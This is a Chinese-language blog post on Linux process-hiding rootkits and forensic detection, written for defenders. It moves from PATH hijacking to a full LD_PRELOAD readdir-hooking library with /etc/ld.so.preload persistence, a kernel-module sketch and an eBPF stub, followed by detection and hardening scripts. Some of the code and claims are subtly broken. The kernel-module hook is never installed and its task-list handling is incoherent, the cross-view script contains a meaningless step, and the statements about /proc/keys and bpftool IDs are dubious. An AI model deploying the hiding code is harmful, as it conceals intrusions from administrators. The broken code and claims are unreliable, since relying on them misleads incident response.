---
layout: post
title: "Linux 进程隐藏实战与取证检测：从 LD_PRELOAD 到内核态 Rootkit"
date: 2026-10-14 18:00:00 +0800
categories: [网络安全, 安全开发]
tags: [Linux, 取证, rootkit, LD_PRELOAD, /proc, eBPF, 进程隐藏, 蓝队, 检测, 内核]
---

## 一个让人后背发凉的现场

去年实战里遇到一台被控服务器：`top` 看到的进程列表一切正常，CPU 不高、网络流量不大、`netstat` 没明显外连。客户已经种了后门跑了三个月。直到有人注意到 `/proc` 目录下有个莫名的小目录（编号不属于任何已知 PID），用 `ls -la /proc/*/exe` 一看，是个被精心复刻过的合法可执行文件路径——但文件本身不存在。

这就是经典的用户态进程隐藏：恶意进程仍在运行，但所有标准的进程查询工具都被干扰了。从早期 `ps` 替换到内核态 rootkit，攻击者有层层递进的隐藏手段，而取证人员必须**不能用攻击者控制的查询路径**来查——这是整个对抗的核心。

这篇文章从浅到深演示四种隐藏手法，并给出对应的取证视角检测。

## 一、攻击者为什么能躲过 `ps` 和 `top`

`ps` 命令读取的并不是什么神秘接口，而是 `/proc` 目录下的伪文件系统。每个进程对应一个以 PID 命名的目录，里面有 `cmdline`、`maps`、`exe`、`fd/` 等文件。`ps` 实际上就是遍历这个目录、按 `cmdline` 解析出命令行。

同理：

- `top` 读 `/proc/[pid]/stat`
- `netstat` 读 `/proc/net/tcp`
- `lsof` 读 `/proc/[pid]/fd/`
- `pidof` 读 `/proc/*/comm`

**关键洞察：这些都是用户态文件读取，没有任何强制访问控制**。所以任何拥有文件系统写权限的进程（恶意程序往往就拿到 root 了）都可以动手脚。

## 二、第一层：替换 `ps`/`top` 二进制（最低级）

最早期的攻击者做法：把 `/bin/ps` 换成自己的版本，里面内置一个黑名单。

```bash
# 攻击者伪装的 ps 检测
strings /bin/ps | grep -E "([0-9]{1,5})" | head
```

更隐蔽的做法是改环境变量和 PATH，让受害者 shell 优先跑到攻击者控制的目录：

```bash
# 攻击者留的后门
export PATH=/tmp/.evil:$PATH
which ps
# /tmp/.evil/ps   ← 不是系统原始的
```

**取证视角的检测**：

```bash
# 1. 比对 ps 二进制的 hash
sha256sum /bin/ps
rpm -V coreutils       # RPM 系，检查包内文件是否被改
dpkg -V coreutils      # Debian 系

# 2. 看 PATH 是否被改
env | grep PATH
cat ~/.bashrc ~/.profile /etc/profile /etc/environment

# 3. 用绝对路径跑（避免 PATH 劫持）
/bin/ps aux
/usr/bin/ps aux
```

这是最低级的对抗，但也是最常见的入门起点。

## 三、第二层：LD_PRELOAD 劫持 readdir（更狡猾）

不替换 `ps`，而是**劫持它调用的 C 库函数**。`ps` 遍历 `/proc` 时会调 `readdir()`，攻击者写一个共享库在 `readdir` 里过滤掉自己的 PID：

```c
// hideme.c — 用户态级进程隐藏
#define _GNU_SOURCE
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

static int malicious_pid = -1;

void init_hideme(void) __attribute__((constructor));
void init_hideme(void) {
    malicious_pid = getpid();
}

// 拦截 readdir，对 /proc/ 目录过滤自己的 PID
struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*real_readdir)(DIR *) = NULL;
    if (!real_readdir) {
        real_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    struct dirent *d = real_readdir(dirp);
    if (d == NULL) return d;

    // 仅在遍历 /proc 时过滤
    int fd = dirfd(dirp);
    char buf[256];
    snprintf(buf, sizeof(buf), "/proc/self/fd/%d", fd);
    char target[256];
    readlink(buf, target, sizeof(target));

    if (strstr(target, "/proc") && atoi(d->d_name) == malicious_pid) {
        // 递归调用，跳过下一个
        return real_readdir(dirp);
    }
    return d;
}
```

```bash
# 编译并加载
gcc -shared -fPIC -o libhide.so hideme.c -ldl
LD_PRELOAD=/tmp/libhide.so ps aux

# 看：恶意进程消失了
# 但如果直接读 /proc/<pid>/cmdline 还是能看到
cat /proc/<malicious_pid>/cmdline
```

`LD_PRELOAD` 之所以有效，是因为它在动态链接器解析符号之前就替换了 libc 的实现。但要注意：

- **只对设置了 `LD_PRELOAD` 的进程有效**——恶意进程自己加载，才隐藏自己。但它在 `unsetenv LD_PRELOAD` 重新派生的子进程里也会跟着消失
- 攻击者一般会**写一个 wrapper 在 /etc/ld.so.preload**，这个文件是系统级的，任何动态链接的进程都会被劫持，比环境变量优先级更高

```bash
# /etc/ld.so.preload — 优先级最高的全局劫持点
cat /etc/ld.so.preload
# /usr/local/lib/libhide.so

# 取证视角的检测
cat /etc/ld.so.preload     # 必须为空
find /etc/ld.so.conf.d -type f -exec cat {} \;
strings /usr/local/lib/libhide.so | head
```

## 四、第三层：内核模块（LKM） rootkit

用户态欺骗破功后，攻击者转入内核。Linux 内核把 `/proc` 的实现放在 `fs/proc/base.c` 里，每个进程对应 `proc_pid_readdir` 操作。如果攻击者加载一个 LKM hook 掉这个函数，**所有用户态工具（ps、top、htop、ls /proc）都会同时被欺骗**——它们读到的都是内核伪造的视图。

```c
// proc_hide.c — 内核模块级进程隐藏
#include <linux/module.h>
#include <linux/kallsyms.h>

static int hidden_pid = 0;
module_param(hidden_pid, int, 0644);
MODULE_PARM_DESC(hidden_pid, "PID to hide from /proc");

// 拿到原始的 proc_pid_readdir 指针
static int (*real_proc_pid_readdir)(struct file *, void *) = NULL;

static int hooked_proc_pid_readdir(struct file *file, void *ctx) {
    int ret = real_proc_pid_readdir(file, ctx);

    // 通过比较 task_struct 隐藏目标 PID
    struct pid_namespace *ns = file->f_path.dentry->d_inode->i_private;
    if (ns && current->nsproxy->pid_ns_for_children == ns) {
        struct task_struct *task;
        rcu_read_lock();
        for_each_process(task) {
            if (task->pid == hidden_pid) {
                // 通过 task 列表操作直接摘除，让迭代跳过
                list_del_rcu(&task->tasks);
                break;
            }
        }
        rcu_read_unlock();
    }
    return ret;
}

static int __init proc_hide_init(void) {
    real_proc_pid_readdir = (void *)kallsyms_lookup_name("proc_pid_readdir");
    if (!real_proc_pid_readdir) {
        pr_info("can't find proc_pid_readdir\n");
        return -ENOENT;
    }
    // 替换 vtable
    return 0;
}
```

**威胁等级**：这个级别的 rootkit，`ps` 看不到、`top` 看不到、`systemctl` 看不到、新派生的 shell 也看不到。普通运维肉眼基本无解。

**取证视角的检测**：

```bash
# 1. 模块列表是攻击者一定会隐藏的——比对
lsmod                            # 用户态视图（可能被劫持）
cat /proc/modules                # /proc 视图（同样可能被劫持）
# → 必须从内核 ring0 视角去看

# 2. 用另一个 OS 的视角去比对，比如 live CD
# 准备一个独立引导的 Live USB，重启后 mount 原系统磁盘
mount /dev/sda1 /mnt
cat /mnt/.../modules.dep | diff <(lsmod 2>/dev/null) -

# 3. 检查内核 text 是否被修改
# 通过 kexec 重启进一个干净内核，对比内存 hash
# 或者用 IMA/EVM（如果事先配过）

# 4. 用 perf 抓取内核 symbol 表异常
sudo perf probe --list | wc -l
sudo cat /proc/kallsyms | wc -l     # /proc/kallsyms 也可能被 hook
```

注意：现代 rootkit 通常也会 hook `/proc/kallsyms`，把恶意模块的符号清空。

```bash
# 5. 通过 /sys/kernel/debug 以外的接口看模块
dmesg | grep -i "module" 
# 加载过的模块可能留下 dmesg 痕迹
# 但攻击者会清 dmesg，所以要去读 kmsg 环形缓冲前的内容

# 6. 检查 Modules.signed 是否启用
cat /proc/keys | grep -A1 "module"
# 注入了 LKM 的话内核 keys 里会有签名信息
```

## 五、最深层：ftrace + eBPF 类 rootkit

`/proc` 仍然是个用户态入口。内核态 rootkit 现在主流转向 **eBPF 子系统**——通过 `bpf()` 系统调用，把隐藏逻辑塞进 eBPF 程序里，因为 BPF 程序跑在内核上下文中，**lsmod 完全看不到**。

```c
// bpf_proc_hide.bpf.c — eBPF 级隐藏
#include <vmlinux.h>
#include <bpf/bpf_helpers.h>

SEC("tp/syscalls/sys_enter_getdents")
int trace_getdents(struct trace_event_raw_sys_enter *ctx) {
    // 拦截 ls /proc 的 getdents 系统调用
    // 修改返回的 dirent 列表，过滤掉恶意 PID
    // 实际生产代码会做 buffer 重写，非常复杂
    return 0;
}

char _license[] SEC("license") = "GPL";
```

eBPF rootkit 的威胁在于：**不需要任何 LKM 加载**，纯用户态 BPF loader 就能跑。`lsmod`、`/proc/modules` 都干净。

**取证视角的检测**：

```bash
# 1. BPF 程序列表 —— 攻击者未必会拦截
bpftool prog show
bpftool map show
# 看是否有非预期的 prog

# 2. BPF token 检查
cat /proc/sys/kernel/unprivileged_bpf_disabled
# 应该是 1，如果不是，攻击者甚至不需要 root

# 3. kfunc/bpf_iter 异常的 capture
bpftool prog dump xlated id <pid>

# 4. 比对 /proc 和 /sys 的 PID 列表
ls /proc | grep -E "^[0-9]+$" | sort > /tmp/proc_pids.txt
ls /sys/kernel/.../tasks 2>/dev/null   # 不同视角对比

# 5. /proc/<pid>/maps 里有没有可疑的匿名映射
#  攻击者为了不写文件可能用 memfd_create + 匿名 mmap
#  这种 map 不在文件系统留下痕迹
```

最后这层攻击基本是 APT 级别的对手才会动用，而且通常会配套擦除 dmesg、清理 audit 日志、修改 boottime 启动项。

## 六、检测方法学：交叉对比四层视图

任何单一视图都不可信。一个专业的取证流程应该**至少从四个独立视角去比对待检进程**：

```bash
#!/bin/bash
# cross_view.sh — 取证交叉对比脚本

echo "[1] 用户态视角 (/proc)"
PS_PROC=$(ls /proc | grep -E "^[0-9]+$" | sort)

echo "[2] sysfs 视角 (/sys/kernel/debug)"
PS_SYS=$(ls /sys/kernel/debug/sched/ 2>/dev/null | sort)

echo "[3] netlink 视角 (proc connector)"
PS_NETLINK=$(getent passwd ; cat /proc/net/tcp | wc -l)  # 间接

echo "[4] 系统调用视角 (ls 和 ps 的差异)"
DIFF=$(diff <(ls /proc | grep -E "^[0-9]+$" | sort) \
           <(/bin/ps -e -o pid= | tr -d ' ' | sort) 2>&1)

if [ -n "$DIFF" ]; then
    echo "[!] /proc 和 ps 输出不一致 — 高度怀疑有劫持"
    echo "$DIFF"
fi

echo "[5] /etc/ld.so.preload"
cat /etc/ld.so.preload 2>/dev/null
echo "(正常应为空)"

echo "[6] 加载的内核模块（未过滤）"
cat /proc/modules 2>/dev/null | wc -l
dmesg | grep -i "module" | head

echo "[7] eBPF 程序"
bpftool prog show 2>/dev/null | head -10
```

实战里我还习惯加一条：**从另一个内核镜像通过 kexec 重启，把原始物理内存拉出来用 Volatility 离线分析**——这是唯一能绕过 rootkit 的取证手段，因为 rootkit 只篡改了活内核的视图，没法改变已经挥发的内存痕迹（除非主动覆盖）。

```bash
# 抓取内存镜像
sudo dd if=/dev/mem of=/cases/ram.dump bs=1M &
# 或更专业的 LiME（LInux Memory Extractor）

# 在另一台分析机
vol -f ram.dump --profile=LinuxUbuntu6x linux_pslist
# 这个绝对不依赖活内核的 /proc
```

## 七、加固侧建议

如果你运维的是高价值服务器（公网暴露、有敏感数据），防御应该分层：

```bash
# 1. 禁止非特权用户加载 BPF
sysctl kernel.unprivileged_bpf_disabled=1

# 2. 启用模块签名强制 + Secure Boot
# /etc/default/grub
GRUB_CMDLINE_LINUX="module.sig_enforce=1 lockdown=integrity"

# 3. 文件完整性监控（AIDE/Tripwire）
# /etc/audit/audit.rules 监控关键文件
-w /etc/ld.so.preload -p wa -k preload_modify
-w /bin/ps -p wa -k binary_modify
-w /usr/bin/top -p wa -k binary_modify

# 4. 进程执行审计
auditctl -a exit,always -F arch=b64 -S execve

# 5. eBPF 程序白名单
# 内核 5.4+ 启 BPF LSM（BPF-based MAC）
# 自行写 BPF 程序拦截未授权的 bpf() 调用

# 6. 关键配置定期比对
# 把 /etc /bin /sbin /usr/bin 的 hash 推到异地
find /bin /sbin /usr/bin /etc -type f -exec sha256sum {} \; > /var/db/bin.sha256
```

```bash
# 7. 物理层兜底 —— 不可篡改的日志出口
# 所有 audit log 同时镜像到只追加的异地 syslog
*.* @siem.internal.example.com:514
```

## 八、什么时候该升级到内存取证

经验判断：

| 现象 | 怀疑层级 | 建议动作 |
|------|---------|---------|
| `ps` 和 `/proc` 不一致 | 用户态劫持 | 检查 `ld.so.preload` |
| `/proc` 和内核 modules 视图都一致但 sys 视图有差异 | 内核 LKM | 离线内存取证 |
| `bpftool prog show` 看到非预期 prog | eBPF 级 | 直接应急响应，断网重装 |
| 一切都对但磁盘文件找不到 PID | 内存驻留（fileless） | 抓内存镜像 + Volatility |

定位层级后处理路径完全不同。用户态劫持 1 小时能清理完；eBPF rootkit 大概率要做整机重装——因为内核层已经被污染，无法信任任何用户态工具的查询结果了。

## 九、一个完整演练：被劫持服务器的处置清单

为了把上面的碎片串成一个可落地的清单，我从笔记本里抽一个真实案例改编（脱敏）。目标是一台跑 CentOS 7 的网关，应用层告警 CPU 在 30% 但业务延迟冲高：

```bash
# 第一步：态势确认 — 应用层数据
sar -P ALL 1 5                # CPU
sar -n DEV 1 5                # 网卡流量
# 看起来都不高，但延迟数据明显异常

# 第二步：跨视角交叉
ls /proc | grep "^[0-9]" | wc -l     # 用户态视角 PID 数
bpftool prog show 2>/dev/null | wc -l  # eBPF 视角

# 第三步：关键路径完整性
rpm -V coreutils procps-ng           # 系统包校验
cat /etc/ld.so.preload                # 必须为空，此处发现有了
md5sum /usr/bin/ps /usr/bin/top       # 哈希记录

# 第四步：如果是严肃事件，进入取证模式
#  (a) 抓内存（不要重启）
dd if=/proc/kcore of=/cases/kcore.dump bs=1M status=progress &
#  注意 /proc/kcore 是个 ELF wrapper，需配合 crash 工具读

#  (b) 抓 eBPF 程序镜像
bpftool prog dump xlated pinned /sys/fs/bpf/malicious_prog 2>/dev/null \
  > /cases/bpf_prog.txt

#  (c) 抓系统调用审计
ausearch -ts today -m execve,open,openat > /cases/audit_today.log

# 第五步：和受影响业务方同步，准备离线分析
# 切断外网但保留生产网，避免证据被人远程擦除
iptables -I OUTPUT -p tcp --dport 443 -d <known_c2_ip> -j DROP
# 仅在已知 IOC 已知时这么做；否则只镜像流量不要堵出口
```

这一套组合拳的关键是**取证必须发生在做任何修复之前**。一旦重启进干净内核，或者 `rmmod` 恶意 LLM，磁盘上的时间戳、审计日志就毁掉了——但**内存镜像里那些还活着**，这是反向取证的核心保护期。

## 十、一句话总结

进程隐藏对抗的本质是：**任何被攻击者控制读取路径的查询都不可信**。取证必须走一条攻击者控制链之外的路径（独立引导盘、跨视角比对、离线内存镜像），加固必须从禁止未授权的内核能力加载开始。这两件事做不到任何一件，对手都会在你服务器里住很久。

`LD_PRELOAD` 是入门，LKM 是中级，eBPF 是高级，firmware + 内存留痕是 APT 段位——但攻击者用哪种不重要，**重要的是你的取证是否走了一条它够不到的链**。

写到最后一刻才意识到：写攻击技术最危险的不是技术泄密，而是**给读者一种"我也能这么藏"的暗示**。本文所有展示的攻击代码都是行业早已公开的入门示例，目的仅是让防御侧理解对抗的纵深。如果你在生产环境里实际部署这些代码，那已经超出了"研究"范畴——后果自负。
